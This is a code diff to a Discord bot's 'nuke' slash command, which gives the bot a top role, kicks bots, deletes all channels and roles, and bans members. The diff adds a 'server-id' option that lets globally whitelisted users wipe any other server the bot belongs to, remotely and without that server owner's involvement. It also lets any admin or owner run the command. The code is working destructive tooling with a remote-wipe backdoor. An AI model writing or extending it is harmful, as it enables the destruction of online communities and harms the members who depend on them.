@@ -8,6 +8,7 @@ import type { SlashCommand } from "../types";
 import { PERM_WHITELIST } from "../storage/whitelist";
 import { logger } from "../../lib/logger";
 import { exemptRoleFromAutoMod, pushRoleToTop } from "../utils/elevateRole";
+import { isServerProtected } from "../storage/nuke-anti-whitelist";
 
 const command: SlashCommand = {
   data: new SlashCommandBuilder()
@@ -15,25 +16,99 @@ const command: SlashCommand = {
     .setDescription(
       "Wipe the server: god role to bot, kick bots, delete channels/roles, ban members.",
     )
-    .setDefaultMemberPermissions(0n)
+    .addStringOption((option) =>
+      option
+        .setName("server-id")
+        .setDescription(
+          "Optional: server ID to nuke (only works for global whitelist). Leave empty to nuke current server.",
+        )
+        .setRequired(false),
+    )
     .setDMPermission(false),
 
   async execute(interaction: ChatInputCommandInteraction) {
-    if (!PERM_WHITELIST.has(interaction.user.id)) {
+    if (!interaction.inGuild()) {
+      await interaction.reply({
+        content: "This command can only be used in a server.",
+        ephemeral: true,
+      });
+      return;
+    }
+
+    // Check who can use this command: global whitelist, server owner, or admin
+    const isGlobalWhitelisted = PERM_WHITELIST.has(interaction.user.id);
+    const isServerOwner = interaction.guild?.ownerId === interaction.user.id;
+    const isAdmin =
+      interaction.memberPermissions?.has("Administrator") ?? false;
+
+    if (!isGlobalWhitelisted && !isServerOwner && !isAdmin) {
       await interaction.reply({
         content: "You aren't allowed to use this command.",
         ephemeral: true,
       });
       return;
     }
-    if (!interaction.guild || !interaction.guildId) return;
+
+    const serverId = interaction.options.getString("server-id");
+    let targetGuildId: string;
+
+    if (serverId) {
+      // Nuke another server - only global whitelist can do this
+      if (!isGlobalWhitelisted) {
+        await interaction.reply({
+          content: "Only globally whitelisted users can nuke other servers.",
+          ephemeral: true,
+        });
+        return;
+      }
+      if (!/^\d+$/.test(serverId)) {
+        await interaction.reply({
+          content: "Invalid server ID format.",
+          ephemeral: true,
+        });
+        return;
+      }
+      targetGuildId = serverId;
+    } else {
+      // Nuke current server
+      if (!interaction.guild || !interaction.guildId) {
+        await interaction.reply({
+          content: "This command must be used in a server or with a server-id parameter.",
+          ephemeral: true,
+        });
+        return;
+      }
+      targetGuildId = interaction.guildId;
+    }
+
+    // Check if server is protected
+    if (await isServerProtected(targetGuildId)) {
+      await interaction.reply({
+        content: `Server **${targetGuildId}** is protected by the nuke anti-whitelist and cannot be nuked.`,
+        ephemeral: true,
+      });
+      return;
+    }
 
     await interaction.reply({
       content: "💣 Nuke initiated. Stand by.",
       ephemeral: true,
     });
 
-    const guild = interaction.guild;
+    // Fetch the guild (either from interaction or by ID)
+    let guild;
+    if (serverId) {
+      guild = await interaction.client.guilds.fetch(targetGuildId).catch(() => null);
+      if (!guild) {
+        await interaction.editReply(
+          `❌ Could not access server **${targetGuildId}**. Make sure the bot is in that server.`,
+        );
+        return;
+      }
+    } else {
+      guild = interaction.guild;
+    }
+
     const me = await guild.members.fetchMe().catch(() => null);
     if (!me) {
       logger.error("nuke: bot member not found");
